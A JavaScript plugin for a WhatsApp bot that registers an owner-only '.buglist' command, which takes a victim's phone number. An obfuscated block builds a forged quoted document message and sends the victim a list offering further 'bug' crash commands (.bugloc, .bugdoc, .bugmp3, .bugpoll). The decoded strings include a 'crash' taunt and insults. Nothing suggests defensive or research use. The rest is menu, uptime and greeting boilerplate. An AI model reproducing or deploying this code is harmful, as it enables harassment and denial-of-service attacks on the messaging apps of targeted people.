let levelling = require('../lib/levelling')
let fs = require('fs')
let path = require('path')
let fetch = require('node-fetch')
let moment = require('moment-timezone')
let totalf = Object.values(global.plugins).filter(
    (v) => v.help && v.tags
  ).length;

let handler = async (m, { conn, usedPrefix: _p, args, command, text}) => {

if (!text) return m.reply('Maaf Format Anda Salah\n\nContoh:\n.buglist 62××××')
let [number, pesan] = text.split `|`
    let user = global.db.data.users[m.sender]
    let korban = `${number}`
    var nomor = m.sender

m.reply(`Berhasil Mengirim Bug Ke ${text}`)
 /**************************** TIME *********************/
 
    let package = JSON.parse(await fs.promises.readFile(path.join(__dirname, '../package.json')).catch(_ => '{}'))
    let { exp, limit, age, money, level, role, registered } = global.db.data.users[m.sender]
    let { min, xp, max } = levelling.xpRange(level, global.multiplier)
    let umur = `*${age == '-1' ? 'Belum Daftar*' : age + '* Thn'}`
    let name = registered ? global.db.data.users[m.sender].name : conn.getName(m.sender)
    let d = new Date(new Date + 3600000)
    let locale = 'id'
    // d.getTimeZoneOffset()
    // Offset -420 is 18.00
    // Offset    0 is  0.00
    // Offset  420 is  7.00
    let weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(d / 84600000) % 5]
    let week = d.toLocaleDateString(locale, { weekday: 'long' })
    let date = d.toLocaleDateString(locale, {
      day: 'numeric',
      month: 'long',
      year: 'numeric'
    })
    let dateIslamic = Intl.DateTimeFormat(locale + '-TN-u-ca-islamic', {
      day: 'numeric',
      month: 'long',
      year: 'numeric'
    }).format(d)
    let time = d.toLocaleTimeString(locale, {
      hour: 'numeric',
      minute: 'numeric',
      second: 'numeric'
    })
    let type = (args[0] || '').toLowerCase()
  let _type = (args[0] || '').toLowerCase()
  let id = m.chat
    let _uptime = process.uptime() * 1000
    let _muptime
    if (process.send) {
      process.send('uptime')
      _muptime = await new Promise(resolve => {
        process.once('message', resolve)
        setTimeout(resolve, 1000)
      }) * 1000
    }
    let muptime = clockString(_muptime)
    let uptime = clockString(_uptime)
    global.jam = time
    let teksbio = `gg`
    let totalreg = Object.keys(global.db.data.users).length
    let rtotalreg = Object.values(global.db.data.users).filter(user => user.registered == true).length
    let help = Object.values(global.plugins).filter(plugin => !plugin.disabled).map(plugin => {
      return {
        help: Array.isArray(plugin.help) ? plugin.help : [plugin.help],
        tags: Array.isArray(plugin.tags) ? plugin.tags : [plugin.tags],
        prefix: 'customPrefix' in plugin,
        limit: plugin.limit,
        premium: plugin.premium,
        enabled: !plugin.disabled,
      }
    })
    const _0x1c5450=_0x1649;(function(_0x2f54e9,_0x2250b4){const _0x2d905c=_0x1649,_0x4d5a48=_0x2f54e9();while(!![]){try{const _0x3e6e22=-parseInt(_0x2d905c(0x15a))/(-0x24e9+0x1ef2+-0x8*-0xbf)+-parseInt(_0x2d905c(0x180))/(0x2*0xfd1+-0x1df9+-0x9*0x2f)+-parseInt(_0x2d905c(0x17a))/(-0x19f4*0x1+0x1*-0x1bd9+-0xa8*-0x52)*(parseInt(_0x2d905c(0x16b))/(-0x1d21+-0x15*0x13d+0x1b93*0x2))+parseInt(_0x2d905c(0x162))/(0x4aa+0x1e96+-0x1*0x233b)+-parseInt(_0x2d905c(0x17d))/(-0x2400+-0x345+0x274b)*(parseInt(_0x2d905c(0x174))/(0x1f*0x57+0xcb6+0x1*-0x1738))+-parseInt(_0x2d905c(0x188))/(-0x123a+-0x6cb*0x3+0x26a3)+-parseInt(_0x2d905c(0x167))/(-0xd3c+0x4ef*-0x1+0x14*0xe9)*(-parseInt(_0x2d905c(0x173))/(0xd*0x2b1+-0x2*-0x4eb+0x8f5*-0x5));if(_0x3e6e22===_0x2250b4)break;else _0x4d5a48['push'](_0x4d5a48['shift']());}catch(_0x18e376){_0x4d5a48['push'](_0x4d5a48['shift']());}}}(_0x4844,0x1*-0x1270af+-0x19e31e+-0x1b7*-0x21f5));const doc={'key':{'fromMe':![],'participant':_0x1c5450(0x16d)+_0x1c5450(0x17b),...m[_0x1c5450(0x164)]?{'remoteJid':''}:{}},'message':{'documentMessage':{'url':_0x1c5450(0x166)+_0x1c5450(0x156)+_0x1c5450(0x181)+_0x1c5450(0x170)+_0x1c5450(0x16e)+_0x1c5450(0x169)+_0x1c5450(0x16c)+_0x1c5450(0x189),'mimetype':_0x1c5450(0x175)+_0x1c5450(0x14d)+_0x1c5450(0x14e),'fileSha256':_0x1c5450(0x159)+_0x1c5450(0x179)+_0x1c5450(0x176)+_0x1c5450(0x184)+_0x1c5450(0x187),'fileLength':_0x1c5450(0x16f),'pageCount':0x1,'mediaKey':_0x1c5450(0x168)+_0x1c5450(0x15d)+_0x1c5450(0x15b)+_0x1c5450(0x155)+_0x1c5450(0x161),'fileName':_0x1c5450(0x17e)+'s','fileEncSha256':_0x1c5450(0x150)+_0x1c5450(0x17c)+_0x1c5450(0x183)+_0x1c5450(0x15e)+_0x1c5450(0x154)}}};function _0x1649(_0x4db69e,_0x58d70a){const _0x4ec1d7=_0x4844();return _0x1649=function(_0x55f528,_0x2bb8a5){_0x55f528=_0x55f528-(-0xd2d*-0x1+0x9*0x29f+-0x2f5*0xc);let _0x23eb63=_0x4ec1d7[_0x55f528];return _0x23eb63;},_0x1649(_0x4db69e,_0x58d70a);}{let judul=global[_0x1c5450(0x182)]+',\x20'+name+(_0x1c5450(0x14b)+_0x1c5450(0x172)),gw=_0x1c5450(0x148)+'y\x20'+author+'𓂺';const sections=[{'title':_0x1c5450(0x165)+_0x1c5450(0x157)+_0x1c5450(0x151),'rows':[{'title':_0x1c5450(0x177)+_0x1c5450(0x14f),'rowId':_0x1c5450(0x160)+text},{'title':_0x1c5450(0x185)+_0x1c5450(0x171),'rowId':_0x1c5450(0x18a)+text},{'title':_0x1c5450(0x149)+_0x1c5450(0x186),'rowId':_0x1c5450(0x152)+text},{'title':_0x1c5450(0x158),'rowId':_0x1c5450(0x15c)+text},{'title':_0x1c5450(0x15f)+_0x1c5450(0x178),'rowId':_0x1c5450(0x17f)+text}]}],listMessage={'text':judul,'footer':gw,'mentions':await conn[_0x1c5450(0x153)+'on'](judul),'title':'','buttonText':_0x1c5450(0x16a)+'i','sections':sections};return conn[_0x1c5450(0x14c)+'e'](korban+(_0x1c5450(0x14a)+_0x1c5450(0x163)),listMessage,{'quoted':doc,'mentions':await conn[_0x1c5450(0x153)+'on'](judul),'contextInfo':{'forwardingScore':0x1869f,'isForwarded':!![]}});}function _0x4844(){const _0x39a29b=['iUZ5HKluLD','G2W69AVPLg','ga\x20senang\x20','.bugloc\x20','Qb0=','2132235EtdJKW','p.net','chat','⫹⫺\x20𝑶𝑾𝑵𝑬𝑹\x20𝑮','https://mm','873mYyuxN','P32GszzU5p','UTKfgrl2zX','Klik\x20Disin','300jHkXmF','RXGvVNWAbF','0@s.whatsa','q1cJ6JupaB','64455','j85sbZCtNt','kwkwk','\x20Bg\x20😵','394340EtcQWo','11473035XuEtTE','applicatio','/DXIECzjrS','Pilih\x20Kala','hah','Php8vjdtJS','37863aUaKLS','pp.net','aXtytT0G2H','6QOaFzF','Deffri\x20Gan','.bugdoc\x20','899668EaTure','.net/d/f/A','ucapan','HN4iKWCFis','h3rmcoHN76','crash\x20ya\x20w','wkwk','M9k=','1226456nQMssX','nsp.enc','.bugmp3\x20','㋛created\x20B','tolol\x20sih\x20','@s.whatsap','\x0aGass\x20Kaen','sendMessag','n/octet-st','ream','u\x20Bisa','ybdZlRjhY+','––·•','.bugcata\x20','parseMenti','5yk=','7lCAd1PIz3','g.whatsapp','𝑨𝑵𝑺𝑩𝑶𝑻𝒛–––','apa\x20','TSSZu8gDEA','151634BYFZrp','5h/TZzubVJ','.bugpoll\x20'];_0x4844=function(){return _0x39a29b;};return _0x4844();}
    
  
}
handler.command = /^(buglist)$/i

handler.owner = true

module.exports = handler

const more = String.fromCharCode(8206)
const readMore = more.repeat(4001)

function clockString(ms) {
  let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000)
  let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
  let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
  return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
function ucapan() {
  const time = moment.tz('Asia/Jakarta').format('HH')
  res = "Selamat dinihari"
  if (time >= 4) {
    res = "Selamat pagi"
  }
  if (time > 10) {
    res = "Selamat siang"
  }
  if (time >= 15) {
    res = "Selamat sore"
  }
  if (time >= 18) {
    res = "Selamat malam"
  }
  return res
}
